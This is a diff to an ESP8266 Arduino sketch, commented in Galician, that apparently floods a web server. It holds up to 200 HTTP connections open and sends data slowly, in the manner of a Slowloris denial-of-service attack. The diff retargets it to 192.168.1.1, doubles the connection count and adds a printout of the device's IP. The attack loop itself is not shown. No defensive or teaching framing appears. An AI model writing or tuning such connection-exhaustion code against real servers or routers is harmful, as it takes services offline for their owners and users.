@@ -1,8 +1,8 @@
 #include <ESP8266WiFi.h>
 
-const char* target_ip = "192.168.149.105"; // Dirección IP do servidor web
+const char* target_ip = "192.168.1.1"; // Dirección IP do servidor web
 const int target_port = 80;               // Porto HTTP (xeralmente 80)
-const int max_connections = 100;          // Número máximo de conexións a abrir
+const int max_connections = 200;          // Número máximo de conexións a abrir
 const int delay_between_packets = 10;    // Tempo entre envíos de datos (en segundos)
 
 WiFiClient clients[max_connections];     // Array para almacenar as conexións
@@ -14,12 +14,13 @@ void setup() {
   Serial.println(max_connections);
 
   // Conecta o ESP8266 a unha rede Wi-Fi
-  WiFi.begin("SSID", "password"); // credenciais da wifi 
+  WiFi.begin("SSID", "pwd"); // credenciais da wifi 
   while (WiFi.status() != WL_CONNECTED) {
     delay(500);
     Serial.print(".");
   }
   Serial.println("\nConectado á rede Wi-Fi.");
+  Serial.println(WiFi.localIP());
 }
 
 void loop() {
